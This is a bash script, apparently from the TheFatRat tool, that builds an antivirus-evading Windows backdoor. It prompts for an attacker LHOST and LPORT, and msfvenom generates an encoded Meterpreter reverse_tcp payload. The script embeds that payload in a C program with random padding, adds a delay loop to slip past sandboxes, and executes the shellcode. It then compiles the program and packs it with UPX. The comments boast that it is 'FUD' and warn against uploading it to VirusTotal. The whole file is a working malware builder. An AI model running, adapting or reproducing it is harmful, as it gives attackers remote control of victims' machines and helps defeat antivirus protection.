#!/bin/bash
file="config.path"
if [ -f "$file" ]
then
msfconsole=`sed -n 5p config.path`	
msfvenom=`sed -n 6p config.path`
backdoor=`sed -n 7p config.path`
searchsploit=`sed -n 8p config.path`
else
	echo "Configuration file does not exists , run setup.sh first ."
exit 1
fi

###################################################################################################
# FatRat Coded By Screetsec ( Edo Maland )
# Program to create a C program after it is compiled that will bypass most AV
# Test in Kali Linux :)
# Very Slow to create Backdoor But Very powerfull for bypass AV
# Easy to Use 
# FUD for popular Antivirus :) 
# Dont Upload to virus total
####################################################################################################


#Checking
[[ `id -u` -eq 0 ]] || { echo -e "\e[31mMust be root to run script"; exit 1; }
resize -s 30 76
clear                                   
SERVICE=service;

#This colour 
cyan='\e[0;36m'
green='\e[0;34m'
okegreen='\033[92m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'
BlueF='\e[1;34m'


#Banner
clear
echo
echo -e $yellow""
echo " =========================================================================="
echo -e $okegreen" FatRat Coded By Screetsec ( Edo -Maland- ) "
echo
echo -e $yellow"   / __/ /__ _    __  / _ )__ __/ /_  / _ \___ _    _____ ____/ _/_ __/ / / "
echo "  _\ \/ / _ \ |/|/ / / _  / // / __/ / ___/ _ \ |/|/ / -_) __/ _/ // / / /  "
echo " /___/_/\___/__,__/ /____/\_,_/\__/ /_/   \___/__,__/\__/_/ /_/ \_,_/_/_/   "
echo""
echo -e $okegreen" This program compiles a C program with a meterpreter reverse_tcp payload "
echo " In it that can then be executed on a windows host "
echo " Program to create a C program after it is compiled that will bypass most AV "
echo -e $yellow" =========================================================================="
echo -e $okegreen""

#input lhost and lport

read -p ' Set LHOST IP: ' payloadLHOST; read -p ' Set LPORT: ' payloadLPORT                                                                        



payload="windows/meterpreter/reverse_tcp"
msfvenomBadChars="\x00\xff"
msfvenomEncoder="x86/shikata_ga_nai"
msfvenomIterations="3"  # Recommended value: 3

randomness=3517		# The higher the randomness the more padding is added to the c program increasing the binaries size
delayRandomness=32676	# The higher the delay the longer it will take to execute the payload, may increase your chances of escaping a sandbox

#Set directory
currentDir=`pwd`
outputDir="${currentDir}/output/"
outputExe="${outputDir}Powerfull.exe"  # You can change the name of the executable on this line
outputUPX="${outputDir}Powerfull-fud.exe"  # You can change the name of the executable on this line

cProg="${currentDir}/prog.c"
cProgTemp="${currentDir}/prog.c.temp"

# Create some padding to be compiled in the C program this adds randomness to the binary
function old_generatePadding {

    counter=0
    randomNumber=$((RANDOM%${randomness}+7))
    while [  $counter -lt $randomNumber ]; do
        echo "" >> $cProg
	randomCharnameSize=$((RANDOM%5+12))
	randomPaddingSize=$((RANDOM%1024+2048))
        randomCharname=`cat /dev/urandom | tr -dc 'a-zA-Z' | head -c ${randomCharnameSize}`
        randomPadding=`cat /dev/urandom | tr -dc '_a-zA-Z0-9' | head -c ${randomPaddingSize}`
        echo "unsigned char ${randomCharname}[]=\"$randomPadding\";" >> $cProg
        let counter=counter+1
    done
}

function generatePadding {

    paddingArray=(0 1 2 3 4 5 6 7 8 9 a b c d e f)

    counter=0
    randomNumber=$((RANDOM%${randomness}+23))
    while [  $counter -lt $randomNumber ]; do
        echo "" >> $cProg
	randomCharnameSize=$((RANDOM%10+7))
        randomCharname=`cat /dev/urandom | tr -dc 'a-zA-Z' | head -c ${randomCharnameSize}`
	echo "unsigned char ${randomCharname}[]=" >> $cProg
    	randomLines=$((RANDOM%20+13))
	for (( c=1; c<=$randomLines; c++ ))
	do
		randomString="\""
		randomLength=$((RANDOM%11+7))
		for (( d=1; d<=$randomLength; d++ ))
		do
			randomChar1=${paddingArray[$((RANDOM%15))]}
			randomChar2=${paddingArray[$((RANDOM%15))]}
			randomPadding=$randomChar1$randomChar2
	        	randomString="$randomString\\x$randomPadding"
		done
		randomString="$randomString\""
		if [ $c -eq ${randomLines} ]; then
			echo "$randomString;" >> $cProg
		else
			echo $randomString >> $cProg
		fi
	done
        let counter=counter+1
    done
}


# Check to see the output directory exists
if [[ ! -d "$outputDir" ]]; then
    mkdir $outputDir
fi

echo ""
echo "You may see multiple errors until the executable is compiled successfully."
echo ""
if [[ $msfvenomIterations > 3 ]]; then
	echo "Most of the errors are due to the msfvenom iterations value is set too high."
	echo "Recommended value: msfvenomIterations=3"
fi
echo ""

# Check to see if the executable was previously created
if [[ -f "$outputExe" ]]; then
	echo "Remove the executable at ${outputExe} to recreate it."
	echo ""
fi

# Warn if the gcc-mingw32 package is not located here /usr/bin/i586-mingw32msvc-gcc
# You may need to install the following on Kali Linux to compile the C to an Exe - "apt-get install gcc-mingw32"
# check mingw if exists
      which i586-mingw32msvc-gcc > /dev/null 2>&1
      if [ "$?" -eq "0" ]; then
      echo [✔]::[mingw32]: installation found!;
      COMPILER="i586-mingw32msvc-gcc"
else
      which i686-w64-mingw32-gcc > /dev/null 2>&1
      if [ $? -eq 0 ]; then
      echo [✔]::[mingw32]: installation found!;
      COMPILER="i686-w64-mingw32-gcc"
else
   echo [x]::[warning]:this script require mingw32 installed to work ;
   echo ""
   echo [!]::Run setup.sh to install mingw32 ;
   sleep 2
   exit 1
 fi
fi

# check upx if exists
      which upx > /dev/null 2>&1
      if [ -d $find ]; then
      echo [✔]::[Upx]: installation found!;

else

   echo [x]::[warning]:this script require upx to work ;
   echo ""
   echo [!]::Run setup.sh to install upx ;
   echo ""
   sleep 2
   exit 1
fi

sleep 2


# Until the Powerfull.exe is compiled successfully loop until it is
while [[ ! -f "$outputExe" ]]; do

    # Delete the c program and recreate it
    rm -f $cProg

    generatePadding

    echo "" >> $cProg
    echo "int main(void)" >> $cProg
    echo "{" >> $cProg

    # Introduce a couple of processing loops for a delay
    echo "" >> $cProg
    echo "int zewd5 = 1, rqs3 = 1;" >> $cProg
    echo "for ( zewd5 = 1 ; zewd5 <= ${delayRandomness} ; zewd5++ )" >> $cProg
    echo "   for ( rqs3 = 1 ; rqs3 <= ${delayRandomness} ; rqs3++ )" >> $cProg
    echo "   {}" >> $cProg
    echo "" >> $cProg
  
    generatePadding
  
    echo "" >> $cProg
    $msfvenom -p ${payload} LHOST=$payloadLHOST LPORT=$payloadLPORT -b ${msfvenomBadChars} -e ${msfvenomEncoder} -i ${msfvenomIterations} -f c >> $cProg

    generatePadding

    echo "" >> $cProg
    echo "((void (*)())buf)();" >> $cProg
    echo "" >> $cProg

    generatePadding

    echo "" >> $cProg
    echo "}" >> $cProg
	
    randomBufNameSize=$((RANDOM%10+23))
    randomBufName=`cat /dev/urandom | tr -dc 'a-zA-Z' | head -c ${randomBufNameSize}`
    cat $cProg | sed "s/buf/${randomBufName}/g" > $cProgTemp
    mv -f $cProgTemp $cProg
    # To install the following program on Kali Linux - "apt-get install gcc-mingw32"
    $COMPILER -o $outputExe $cProg

done

# Use UPX to create a second executable, testing...
upx -q --ultra-brute -o $outputUPX $outputExe
